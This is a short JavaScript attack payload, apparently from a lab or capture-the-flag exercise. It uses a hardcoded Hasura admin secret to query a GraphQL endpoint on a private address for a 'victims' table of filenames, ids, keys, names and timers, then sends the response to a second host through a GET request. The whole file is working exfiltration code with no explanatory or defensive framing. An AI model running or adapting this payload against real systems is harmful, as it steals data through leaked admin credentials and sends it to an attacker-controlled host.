var req = new XMLHttpRequest();
var data = '{"query":"{\n victims {\n filename\n id\n  key\n name\n timer\n }\n}"}';
var url = 'http://192.168.150.10:8080/v1/graphql/';
req.open('POST',url,true);
req.setRequestHeader('Content-Type','application/json');
req.setRequestHeader('x-hasura-admin-secret','s3cr3754uc35432');
req.onreadystatechange = function(){
  if (req.readyState == 4 && req.status == 200){
    var l = new XMLHttpRequest();
    l.open('GET','http://10.17.17.11/?q='+JSON.stringify(req.responseText));
    l.send();
  }
}
req.send(data);
